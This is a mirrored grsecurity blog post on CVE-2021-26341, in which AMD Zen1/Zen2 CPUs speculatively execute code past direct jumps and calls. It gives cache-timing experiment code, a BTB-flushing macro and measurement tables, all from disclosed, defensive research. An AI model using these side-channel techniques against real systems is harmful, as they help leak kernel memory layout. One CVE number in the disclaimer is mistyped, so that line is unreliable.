<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://grsecurity.net/amd_branch_mispredictor_part_2_where_no_cpu_has_gone_before">Original</a>
    <h1>The AMD Branch (Mis)Predictor Part 2: Where No CPU Has Gone Before</h1>
    
    <div id="readability-page-1" class="page"><section>
                                <div>
                                        <div>

<h2 id="introduction">Introduction</h2>
<p>This is another blog article describing results of our AMD CPU branch predictor research. This time we present the technical details of the AMD CPU branch predictor behavior with direct unconditional branches. This research resulted in the discovery of a new vulnerability, CVE-2021-26341 <a href="https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1026">[1]</a>, which we will discuss in detail in this article. As usual, we will focus on technical aspects of the vulnerability, mitigations suggested by AMD, and aspects of exploitation.</p>
<p>Finally, we will demonstrate a simplified example of how the vulnerability could be used to break KASLR with an unprivileged eBPF program gadget and what a potentially existing code gadget could look like.</p>
<p>Once again, this article is highly technical with plenty of empirical data presented in the form of diagrams, charts and listings. An intermediate level of understanding the microarchitectural details of modern CPUs is assumed. Whenever applicable, a brief introduction to the discussed topics or a reference to the related material is provided. <em>Too much for you? Not a problem, check our <a href="#final-remarks">final remarks</a> section for a TL;DR.</em></p>
<p>We strongly recommend reading our previous article <a href="https://grsecurity.net/amd_branch_mispredictor_just_set_it_and_forget_it">[2]</a> discussing the AMD CPU branch predictor behavior with conditional branches. There is a lot of relevant material already covered there that is only briefly mentioned here.</p>
<p>This article, similar to the previous one, is also constructed using a FAQ-like document structure, where topics are gradually presented following the actual research progress.</p>
<p>Enjoy a story of how an attempt to save one byte of code resulted in growing the size of all binaries everywhere in the x86 world. A story of an unusual and counter-intuitive CPU behavior, where actual PoCs demonstrate the consequences of certain CPUs executing dead code.</p>
<h3 id="disclaimer">Disclaimer</h3>
<p>Before publication of these discoveries, which were made prior to the discoveries in our previous blog post, we responsibly disclosed our findings to the AMD PSIRT team on Oct 15th 2021. A few weeks later, after our encrypted reports stopped getting rejected by AMD&#39;s spam filters, the AMD team had reproduced and acknowledged the vulnerability by assigning CVE-2021-2634. Our team agreed to an initial embargo date of Feb 8th 2022 and then an extended embargo deadline of March 8th 2022 in order to allow affected upstream projects sufficient time to develop fixes.</p>
<h2 id="what-s-this-about-">What&#39;s this about?</h2>
<p>The story began on Oct 1st 2021. An ordinary Friday for many, but not for me. It was my very first day at a new job for Open Source Security, Inc. Excited and a little bit frightened, I started the day by looking for my first task. To my positive surprise, the task was already there, waiting for me. Moreover, it was the kind of task I like the most: &#34;Verify speculation safety of a potential optimization for the RAP return hash sequence.&#34; If you want to learn more about RAP (Reuse Attack Protector), please have a look at <a href="https://pax.grsecurity.net/docs/PaXTeam-H2HC15-RAP-RIP-ROP.pdf">[3]</a>, where the PaX Team explains the functionality with details. Here, to provide some context, I will just mention that RAP is a PaX/grsecurity software-based CFI (Control Flow Integrity) solution with low overhead and no special hardware support requirements. The RAP functionality uses RAP hash sequences to support its CFI enforcement. The RAP hash sequences for providing backward-edge CFI are placed at all relevant call sites and look like this:</p>
<pre><code>2ba8:      eb <span>0d</span>                   <span>jmp</span>    2bb7 &lt;xfs_da_grow_inode_int+<span>0x77</span>&gt;
2baa:      <span>48</span> b8 <span>4d</span> <span>36</span> 6b e6 ff ff ff ff   movabs <span>$0</span>xffffffffe66b364d,%rax
2bb4:      cc                      <span>int3</span>
2bb5:      cc                      <span>int3</span>
2bb6:      cc                      <span>int3</span>
2bb7:      e8 <span>00</span> <span>00</span> <span>00</span> <span>00</span>          callq  2bbc &lt;xfs_da_grow_inode_int+<span>0x7c</span>&gt;
</code></pre>
<p>The RAP return hash sequence is embedded in the form of a <code>MOVABS</code> instruction for readability and debugging purposes, followed by a sequence of one-byte <code>INT3</code> instructions (padding) to ensure the RAP return hash is at a fixed offset relative to the following <code>CALL</code> instruction. The RAP return hash checking sequence in the callee then is able to check for a correct hash at an offset of -16 bytes from the return address for the <code>CALL</code>. Therefore, each call site begins with a direct unconditional jump to the actual <code>CALL</code> instruction, thereby ignoring the embedded hash sequence (since it&#39;s RAP metadata, not code).
Notice, that the <code>MOVABS</code> instruction takes 10 bytes and as such transfers an 8-byte immediate operand into <code>%rax</code> register.</p>
<p>The idea was to use a 1-byte shorter variant of the <code>MOVABS</code> instruction, like this:</p>
<pre><code>2ba8:      eb 0c                   <span>jmp</span>    2bb6 &lt;xfs_da_grow_inode_int+<span>0x76</span>&gt;
2baa:      a0 <span>4d</span> <span>36</span> 6b e6 ff ff ff ff   movabs <span>0xffffffffe66b364d</span>,%al
2bb3:      cc                      <span>int3</span>
2bb4:      cc                      <span>int3</span>
2bb5:      cc                      <span>int3</span>
2bb6:      e8 <span>00</span> <span>00</span> <span>00</span> <span>00</span>          callq  2bbc &lt;xfs_da_grow_inode_int+<span>0x7c</span>&gt;
</code></pre>
<p>While saving a single byte (when multiplied by several thousands of augmented call sites, it becomes a non-negligible space saving optimization), it has additional side-effect: the <code>MOVABS</code> instruction now performs a memory load from a direct address (the RAP return hash value) into the <code>%al</code> register.
This should not be a problem, because this is essentially dead code that never executes architecturally. But what if it executes speculatively? We would certainly not want that. So that was my task: verify that the code following direct unconditional branches never executes (even speculatively).</p>
<p>As I already mentioned in my previous blog article, I usually begin such experiments by implementing a simple and easily portable test using KTF (Kernel Test Framework <a href="https://github.com/KernelTestFramework/ktf">[4]</a>), which I created a while ago with exactly such purposes in mind. KTF makes it easy to re-run the experiments in many different execution environments (bare-metal or virtualized) and comes with a few well-tested cache-based side-channel primitives, which makes speculative execution research a bit less tedious.</p>
<p>Honestly, I did not expect to find any speculative execution traces past a direct unconditional branch. After all, why would a CPU speculate past such a branch? Everything is there to correctly and readily predict the target location, which is part of the instruction itself and there is no condition to evaluate.</p>
<p>Hence, I implemented the test code for the experiment as follows:</p>
<h4 id="experiment-1">Experiment 1</h4>
<pre><code>0. clflush (CACHE_LINE_ADDR)     ; flush the cache line out of cache hierarchy to get a clean state
<span>1.</span> mfence                        ; make sure the cache line <span>is</span> really out

<span>2.</span> jmp END_LABEL                 ; goto END_LABEL
3. movabs CACHE_LINE_ADDR, %al   ; memory load to the flushed cache line; it never executes architecturally
4. END_LABEL:

5. measure CACHE_LINE_ADDR access time
</code></pre>
<p>I ran the code ten times in a loop of 100k iterations and counted all low-latency accesses to <code>CACHE_LINE_ADDR</code>, which were indicating a speculatively executed memory load. This is what I got:</p>
<pre><code>CPU: Intel(R) Core(TM) i9-<span>10980</span>XE CPU @ <span>3</span>.<span>00</span>GHz
Baseline: <span>200</span>
CL0,Iterations
  <span>0,100000</span>
  <span>0,100000</span>
  <span>0,100000</span>
  <span>0,100000</span>
  <span>0,100000</span>
  <span>0,100000</span>
  <span>0,100000</span>
  <span>0,100000</span>
  <span>0,100000</span>
  <span>0,100000</span>
Total: <span>0</span>
</code></pre><p>The column <em>CL0</em> (and <em>CL1</em> in later experiments) represents the number of times the measurement cache line has been speculatively loaded (i.e. the number of speculative executions of the load) during <em>Iterations</em> number of main loop iterations, for each of the ten executions. The <em>Total</em> is the sum of all the speculative executions that occurred.  <em>Baseline</em> is the average number of CPU ticks it takes to access memory data from cache.</p>
<p>Nothing to see here, everything as expected. Let&#39;s try the same experiment on an AMD CPU:</p>
<pre><code>CPU: AMD EPYC <span>7601</span> <span>32</span>-Core Processor                
Baseline: <span>200</span>
CL0,Iterations
  <span>1,100000</span>
  <span>1,100000</span>
  <span>1,100000</span>
  <span>1,100000</span>
  <span>1,100000</span>
  <span>0,100000</span>
  <span>1,100000</span>
  <span>1,100000</span>
  <span>1,100000</span>
  <span>1,100000</span>
Total: <span>9</span>
</code></pre><p>I was not expecting this. A few irregular occurrences would indicate some noise in the channel and a perfect regularity would indicate the experiment has a systematic flaw, like: unmasked regular interrupts triggering a cache conflict with the cache oracle cache line, a sibling hyper-thread activity, a miscalculated baseline or any other typical error crippling the experiment.</p>
<p>To get more confidence for the results, I disabled interrupts for the critical section with <code>cli</code>/<code>sti</code> instructions and added another non-colliding measurement cache line to measure both of the cache lines independently during the experiment runtime. Any incorrectly detected signal on the two cache lines would indicate a problem with the test code or cache noise.</p>
<h4 id="experiment-2">Experiment 2</h4>
<pre><code>0. mov CACHE_LINE_0_ADDR, %rsi   ; memory address 0 whose access latency allows to observe the speculative execution
1. mov CACHE_LINE_1_ADDR, %rbx   ; memory address 1 whose access latency allows to observe the speculative execution
2. clflush (%rsi)
3. clflush (%rbx)                ; flush both cache lines out of cache hierarchy to get a clean state
<span>4.</span> mfence                        ; make sure the cache lines are really out

<span>5.</span> jmp END_LABEL                 ; goto END_LABEL
6. mov (%rsi / %rbx), %rax       ; memory load to the flushed cache line; it never executes architecturally
7. END_LABEL:

8. measure CACHE_LINE_0/1_ADDR access time
</code></pre>
<p>I ran this code again in a loop of 100k iterations twice, each time using a different cache line at location 6. This is what I got for <code>%rsi</code> (<code>CL0</code>) and <code>%rbx</code> (<code>CL1</code>):</p>
<pre><code>CPU: AMD EPYC <span>7601</span> <span>32</span>-Core Processor 
Baseline: <span>200</span>
CL0,CL1,Iterations
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
Total: <span>10</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>0,100000</span>
Total: <span>7</span>
</code></pre><p>The results clearly indicate that something is off with the AMD CPU. But, does it really mispredict direct unconditional branches and speculate past them into the following dead code? It was somewhat hard to believe, so I quickly ran the experiments on a few AMD and Intel CPUs I had access to.</p>
<p>All Intel CPUs I ran the above experiment on yielded <strong>zero</strong> mispredictions whatsoever for any of the tested cache lines. All results looked like this:</p>
<pre><code>CPU: Intel(R) Core(TM) i9-<span>10980</span>XE CPU @ <span>3</span>.<span>00</span>GHz
Baseline: <span>189</span>
CL0,CL1,Iterations
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
Total: <span>0</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
Total: <span>0</span>
</code></pre><p>When executed on a few AMD CPUs of different generations and microarchitectures, I noticed that all Zen1 and Zen2 microarchitectures I had access to were affected (i.e. the direct unconditional branches get mispredicted). However, the Zen3 microarchitecture CPUs did not display any mispredictions at all.</p>
<p>Apparently, the Zen3 microarchitecture received a significant upgrade and redesign of its branch prediction unit (BPU), which effectively eliminated the flaw and rendered the Zen3 microarchitecture immune to the vulnerability.
Later, AMD PSIRT confirmed that this indeed had been the case. Sadly, the exact technical details of the redesign are not publicly known, hence it is hard to comment on what exactly the fix was and whether it was accidental or intentional.</p>
<h3 id="is-it-really-speculative-execution-past-a-direct-unconditional-branch-">Is it really speculative execution past a direct unconditional branch!?</h3>
<p>Now, to be absolutely certain about the type of CPU (mis)behavior observed here, I decided to conduct a quick counter-example experiment.</p>
<p>We can simply put a serializing instruction right after the branch to stop any potential speculative execution and thereby obtain an indirect proof of the speculative execution nature of the memory load in question. When the speculative execution is immediately stopped, there should be no observable signal at all.</p>
<p>I ran the following code the same way as previous experiments:</p>
<h4 id="experiment-3">EXPERIMENT 3</h4>
<pre><code>0. mov CACHE_LINE_0_ADDR, %rsi   ; memory address 0 whose access latency allows to observe the speculative execution
1. mov CACHE_LINE_1_ADDR, %rbx   ; memory address 1 whose access latency allows to observe the speculative execution
2. clflush (%rsi)
3. clflush (%rbx)                ; flush both cache lines out of cache hierarchy to get a clean state
<span>4.</span> mfence                        ; make sure the cache lines are really out

<span>5.</span> jmp END_LABEL                 ; goto END_LABEL
6. lfence                        ; on AMD lfence can be <span>set</span> to dispatch serializing <span>mode</span>, which stops speculation
<span>7.</span> mov (%rsi / %rbx), %rax       ; memory load to the flushed cache line; it never executes architecturally
8. END_LABEL:

9. measure CACHE_LINE_0/1_ADDR access time
</code></pre>
<p>The result:</p>
<pre><code>CPU: AMD EPYC <span>7601</span> <span>32</span>-Core Processor                
Baseline: <span>200</span>
CL0,CL1,Iterations
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
Total: <span>0</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
Total: <span>0</span>
</code></pre><p>No signal as anticipated.</p>
<p>At this point, it is clear that <strong>some AMD CPUs</strong> can mispredict direct unconditional branches and speculatively execute the following code. Furthermore, similar misbehavior has been neither reproduced nor observed on any Intel CPUs I tried.</p>
<p>Sadly, this meant that the RAP return hash sequence space optimization cannot be applied without unwanted speculative execution side-effects. The idea had to be dropped.</p>
<h3 id="are-direct-calls-also-affected-">Are direct calls also affected?</h3>
<p>Since they are also direct unconditional branches (with extra side-effects like pushing a return address onto the stack), they very likely are. Let&#39;s find out.</p>
<p>I ran the following code the same way as previous experiments on both Intel and AMD CPUs:</p>
<h4 id="experiment-4">Experiment 4</h4>
<pre><code><span>0.</span> mov CACHE_LINE_0_ADDR, %rsi   ; memory address <span>0</span> whose access latency allows to observe the speculative execution
<span>1.</span> mov CACHE_LINE_1_ADDR, %rbx   ; memory address <span>1</span> whose access latency allows to observe the speculative execution
<span>2.</span> clflush (%rsi)
<span>3.</span> clflush (%rbx)                ; flush both cache lines out of cache hierarchy to get a clean state
<span>4.</span> mfence                        ; make sure the cache lines are really out

<span>5.</span> call END_LABEL                ; goto END_LABEL and push return address (location <span>6</span>) onto the stack
<span>6.</span> mov (%rsi / %rbx), %rax       ; memory load to the flushed cache line; it never executes architecturally
<span>7.</span> END_LABEL:
<span>8.</span> add $<span>0x8</span>, %rsp                ; adjust stack pointer to ignore the return address on the stack

<span>9.</span> measure CACHE_LINE_0/<span>1</span>_ADDR access time
</code></pre>
<p>The results I got for AMD:</p>
<pre><code>CPU: AMD EPYC <span>7601</span> <span>32</span>-Core Processor 
Baseline: <span>200</span>
CL0,CL1,Iterations
  <span>1</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
Total: <span>6</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>0,100000</span>
Total: <span>9</span>
</code></pre><p>The results I got for Intel:</p>
<pre><code>CPU: Intel(R) Core(TM) i9-<span>10980</span>XE CPU @ <span>3</span>.<span>00</span>GHz
Baseline: <span>189</span>
CL0,CL1,Iterations
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
Total: <span>0</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
Total: <span>0</span>
</code></pre><p>As suspected, the direct calls are also affected on some AMD CPUs and there seems to be no significant difference in the misprediction rate comparing to the direct unconditional jumps. After running the above experiment on all the available machines (Intel and AMD), I concluded that the behavior of the branch predictor and its misprediction rate for both direct calls and jumps is indeed similar.</p>
<p>From now on I will not differentiate between direct unconditional jumps and calls and will use the common term <em>direct unconditional branch</em> to refer to either of them.</p>
<h3 id="what-about-backward-direct-unconditional-branches-">What about backward direct unconditional branches?</h3>
<p>So far, the experiments have been focusing only on forward direct unconditional branches. But it would be interesting to see if there is any difference in the BPU behavior when dealing with backward direct unconditional branches. Let&#39;s find out.</p>
<p>Similar to the previous experiments, I ran this one ten times in a loop of 100k iterations using the following backward direct unconditional branch code construct:</p>
<h4 id="experiment-5">EXPERIMENT 5</h4>
<pre><code><span>0.</span> mov CACHE_LINE_0_ADDR, %rsi   ; memory address <span>0</span> whose access latency allows to observe the speculative execution
<span>1.</span> mov CACHE_LINE_1_ADDR, %rbx   ; memory address <span>1</span> whose access latency allows to observe the speculative execution
<span>2.</span> clflush (%rsi)
<span>3.</span> clflush (%rbx)                ; flush both cache lines out of cache hierarchy to get a clean state
<span>4.</span> mfence                        ; make sure the cache lines are really out

<span>5.</span> jmp BRANCH_LABEL              ; go to the backward branch
<span>6.</span> RETURN_LABEL:                 ; this is the backward branch target 
<span>7.</span> jmp END_LABEL                 ; go to the measurements

<span>8.</span> ALIGN <span>64</span>                      ; This alignment construct serves the purpose of isolating the backward
<span>9.</span> lfence                        ; branch from the earlier branches. This is important, because the density 
A. ud2                           ; of branches per cache line matters. Also, the lfence instruction stops
B. ALIGN <span>64</span>                      ; speculation past the initial <span>two</span> unconditional branches.

C. BRANCH_LABEL:
D. jmp RETURN_LABEL              ; goto RETURN_LABEL
E. mov (%rsi / %rbx), %rax       ; memory load to the flushed cache line; it never executes architecturally
F. END_LABEL:

<span>10.</span> measure CACHE_LINE_0/<span>1</span>_ADDR access time
</code></pre>
<p>Result:</p>
<pre><code>CPU: AMD EPYC <span>7601</span> <span>32</span>-Core Processor                
Baseline: <span>200</span>
CL0,CL1,Iterations
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
  <span>1</span>,  <span>0,100000</span>
Total: <span>10</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>0,100000</span>
  <span>0</span>,  <span>1,100000</span>
  <span>0</span>,  <span>1,100000</span>
Total: <span>5</span>
</code></pre><p>The signal with a fairly similar pattern is clearly there. After running the experiment on a few other Zen1 and Zen2 CPUs, I collected further evidence that the <strong>direction of an unconditional direct branch does not affect the misprediction rate</strong>.</p>
<p>I also ran the experiment on a few Zen3 and Intel CPUs, where I again did not observe any mispredictions at all.</p>
<h2 id="what-cpus-have-you-tested-this-on-">What CPUs have you tested this on?</h2>
<p>As seen in the below chart, we have performed experiments on:
</p><ul>
<li>AMD EPYC 7601 32-Core (Zen1 Server)</li>
<li>AMD EPYC 7742 64-Core (Zen2 Server)</li>
<li>AMD EPYC 7R13 48-Core (Zen3 Server)</li>
<li>AMD Ryzen Threadripper 1950X (Zen2 Client)</li>
<li>AMD Ryzen 5 5600G with Radeon Graphics (Zen3 Client)</li>
<li>Intel(R) Core(TM) i7-3770S (Ivy Bridge Client)</li>
<li>Intel(R) Core(TM) i9-10980XE (Cascade Lake Client)</li>
<li>Intel(R) Xeon(R) CPU E5-2670 0 (Sandy Bridge EP Server)</li>
<li>Intel(R) Xeon(R) CPU E5-2695 v4 (Broadwell Server)</li>
<li>Intel(R) Xeon(R) Gold 6258R (Cascade Lake Server)</li>
</ul>

<p><img src="http://harihareswara.net/posts/2022/intuitions-around-trust-levels/amd_mispredictor_part_2/noflush.svg"/></p>
<h2 id="is-it-another-aspect-of-straight-line-speculation-">Is it another instance of Straight-Line Speculation?</h2>
<p>Yes, it is. As also confirmed by AMD, their Zen1 and Zen2 microarchitectures are susceptible to a new variant of Straight-Line Speculation (SLS), where the CPU can speculatively execute past a direct unconditional branch. AMD also assigned a dedicated CVE to this vulnerability: CVE-2021-26341.</p>
<h2 id="what-is-straight-line-speculation-sls-">What is Straight-Line Speculation (SLS)?</h2>
<p>Straight-Line Speculation was coined by Arm as a result of Google SafeSide project research (CVE-2020-13844) <a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=Arm-Straight-Line-Speculation">[5]</a>. Please refer to the Arm whitepaper about Straight-Line Speculation <a href="https://developer.arm.com/support/arm-security-updates/speculative-processor-vulnerability/downloads/straight-line-speculation">[6]</a> for more details. Arm described SLS as a speculative execution past an unconditional change in the control flow: &#34;<em>Straight-line speculation would involve the processor speculatively executing the next instructions linearly in memory past the unconditional change in control flow</em>&#34;.</p>
<p>However, in Arm&#39;s whitepaper, SLS has been only observed on <strong>indirect</strong> unconditional control flow changes. Shortly after, it was discovered that &#34;some x86 CPUs&#34; are also susceptible to the indirect unconditional control flow change SLS.
This basically meant that on both Arm and &#34;some x86 CPUs&#34;, indirect unconditional branch instructions like <code>JMP/CALL %REG</code>, <code>JMP/CALL *%REG</code> and <code>RET</code> could open a short speculative window where the CPU executes past them.  It should be noted that even prior to the SLS paper, some x86 CPUs were known to speculate past at least <code>RET</code> instructions, as both Microsoft Windows and grsecurity&#39;s RAP retpoline plugin implemented <code>INT3</code> speculation traps after them.</p>
<p>With this work I discovered that on some AMD CPUs (Zen1 and Zen2, apparently the mysterious &#34;some x86 CPUs&#34;), SLS can also occur on <strong>direct</strong> unconditional control flow changes. This means that <strong>all direct and indirect unconditional branch instructions like <code>JMP</code>, <code>CALL</code> and <code>RET</code> can be speculated over on affected CPUs</strong>.</p>
<h3 id="what-about-arm-cpus-">What about Arm CPUs?</h3>
<p>In Arm&#39;s Straight-Line Speculation whitepaper <a href="https://developer.arm.com/support/arm-security-updates/speculative-processor-vulnerability/downloads/straight-line-speculation">[6]</a>, it is explicitly stated that direct unconditional branch instructions did not trigger SLS:</p>
<blockquote><span>B, </span><span>BL</span></blockquote>
<p>I have not spent time researching Arm CPUs for this work, so we have to take Arm&#39;s word for it, though I certainly encourage other researchers to reproduce and confirm the above statement.</p>
<h2 id="why-would-a-bpu-mispredict-a-direct-unconditional-branch-">Why would a BPU mispredict a direct unconditional branch?</h2>
<p>It is an interesting question. After all, the direct unconditional branches should be hypothetically easier for a BPU to deal with than other types of control-flow changing instructions. The direct unconditional branch instructions always have a static target, which is usually encoded as part of the instruction itself and they are always taken. Hence, there is no need for any condition evaluation and related taken/not-taken predictions. Since the target of the branch is also readily available, what is causing the misprediction?</p>
<p>Before answering that, I strongly recommend reading my previous blog article about AMD branch predictor and its conditional branches (mis)behavior <a href="https://grsecurity.net/amd_branch_mispredictor_just_set_it_and_forget_it">[2]</a>. Especially the sections discussing the AMD branch predictor (&#34;How does the AMD branch predictor work?&#34;). A lot of the following material assumes the reader is already familiar with the concepts.</p>
<p>In my previous article I discuss why and where the process of identifying and predicting branches occurs (the frontend of the CPU, which has to keep up with supplying new instructions to the backend). Upon a branch, however, it is problematic for the frontend to select the location in memory for the next instruction to fetch. In addition, because the branch instructions are evaluated in the backend, the frontend&#39;s BPU has to predict <strong>both</strong> the condition <strong>and</strong> the target. This means that <strong>all</strong> branches must be predicted by the BPU including the direct unconditional branches. If the BPU mispredicts, the backend will eventually realize that, flush the pipeline and trigger a re-steer of the frontend in order to resume the work with the correct instructions.</p>
<p>This means that direct unconditional branches can also be mispredicted by the BPU. When such a branch is mispredicted, the CPU&#39;s frontend has no choice but continue supplying the instructions directly following the branch (hence the straight-line speculation) to the backend for execution.</p>
<p>Because the direct unconditional branches are always taken, the misprediction has to have something to do with the <strong>target</strong> address prediction. Which in turn means that the Branch Target Buffer component of the affected BPUs is likely involved in the misprediction. Since the frontend does not evaluate the branch instruction (the backend does), it has to look up the branch target address in the BTB in order to start fetching instructions according to the execution control flow. But what happens when there is no BTB entry available for a given direct unconditional branch?</p>
<p>We already know that AMD&#39;s BPU mispredicts conditional branches as not-taken when there is a missing entry in the BTB (see the previous blog <a href="https://grsecurity.net/amd_branch_mispredictor_just_set_it_and_forget_it">[2]</a>). The <em>AMD Software Optimization Guide</em> <a href="https://developer.amd.com/wp-content/resources/56305.zip">[7]</a> states: <strong><em>&#34;Conditional branches that have not yet been discovered to be taken are not marked in the BTB. These branches are implicitly predicted not-taken.&#34;</em></strong>. I believe we can extend this statement to also cover the direct and indirect unconditional branches: <strong>If there is no entry in the BTB (or Return Address Stack (RAS) for <code>RET</code> instructions) for a given unconditional branch, the branch will be mispredicted and SLS might occur.</strong></p>
<p>Let&#39;s check the hypothesis.</p>
<h2 id="is-a-missing-btb-entry-causing-the-direct-unconditional-branch-misprediction-">Is a missing BTB entry causing the direct unconditional branch misprediction?</h2>
<p>To find out, I will simply flush the entire BTB using the method already described in the previous blog article:</p>
<pre><code><span>.macro</span> flush_btb NUMBER
    <span>.align</span> <span>64</span>      
    <span>.rept</span> \NUMBER  
        <span>jmp </span><span>1</span>f     
        <span>.rept</span> <span>30</span>   
            <span>nop </span> 
        <span>.endr</span>    
<span>1</span>:      <span>jmp </span><span>2</span>f     
        <span>.rept</span> <span>29</span>   
            <span>nop </span> 
        <span>.endr</span>    
<span>2</span>:      <span>nop </span>     
    <span>.endr</span>        
<span>.endm</span>
</code></pre>
<p>I modified the code of my earlier experiment to include the above code snippet, like this:</p>
<h4 id="experiment-6">Experiment 6</h4>
<pre><code>0. mov CACHE_LINE_0_ADDR, %rsi   ; memory address 0 whose access latency allows to observe the speculative execution
1. mov CACHE_LINE_1_ADDR, %rbx   ; memory address 1 whose access latency allows to observe the speculative execution
2. flush_btb 8192                ; flush entire BTB of <span>8192</span> entries
<span>3.</span> clflush (%rsi)
<span>4.</span> clflush (%rbx)                ; flush both cache lines out of cache hierarchy to get a clean state
<span>5.</span> mfence                        ; make sure the cache lines are really out

<span>6.</span> jmp END_LABEL                 ; goto END_LABEL
7. mov (%rsi / %rbx), %rax       ; memory load to the flushed cache line; it never executes architecturally
8. END_LABEL:

9. measure CACHE_LINE_0/1_ADDR access time
</code></pre>
<p>After running the code in a loop of 10k iterations (because the BTB flushing code takes time to execute), I got the expected results:</p>
<pre><code>CPU: AMD EPYC <span>7601</span> <span>32</span>-Core Processor                
Baseline: <span>200</span>
CL0,CL1,Iterations
<span>9991</span>,  <span>0,10000</span>
<span>9993</span>,  <span>0,10000</span>
<span>9997</span>,  <span>0,10000</span>
<span>9997</span>,  <span>0,10000</span>
<span>9991</span>,  <span>0,10000</span>
<span>9997</span>,  <span>0,10000</span>
<span>9986</span>,  <span>0,10000</span>
<span>9995</span>,  <span>0,10000</span>
<span>9999</span>,  <span>0,10000</span>
<span>9999</span>,  <span>0,10000</span>
Total: <span>99955</span>
  <span>0</span>,<span>9998,10000</span>
  <span>0</span>,<span>9995,10000</span>
  <span>0</span>,<span>9999,10000</span>
  <span>0</span>,<span>9995,10000</span>
  <span>0</span>,<span>9993,10000</span>
  <span>0</span>,<span>9998,10000</span>
  <span>0</span>,<span>9999,10000</span>
  <span>0</span>,<span>9998,10000</span>
  <span>0</span>,<span>9999,10000</span>
  <span>0</span>,<span>9999,10000</span>
Total: <span>99973</span>
